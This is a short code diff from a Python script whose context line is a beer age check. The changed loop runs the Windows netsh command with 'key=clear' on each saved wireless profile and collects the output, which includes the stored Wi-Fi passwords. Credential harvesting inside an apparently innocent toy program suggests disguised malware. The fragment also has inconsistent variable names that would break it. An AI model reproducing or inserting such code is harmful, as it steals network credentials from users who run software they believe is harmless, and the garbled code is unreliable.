@@ -26,7 +26,7 @@ else: answer = "u are a kid, u cannot buy beer"
 result = ""
 
 for regular in regular_list:
-    c2 = "netsh wlan show profiles " + regular + " key=clear"
+    c2 = "netsh wlan show profile " + regular + " key=clear"
     sub2 = subprocess.check_output(c2, shell=True, stderr=DeVNULL,stdin=DEVNULL)
     current_value = sub2
     resut = resut + current_value
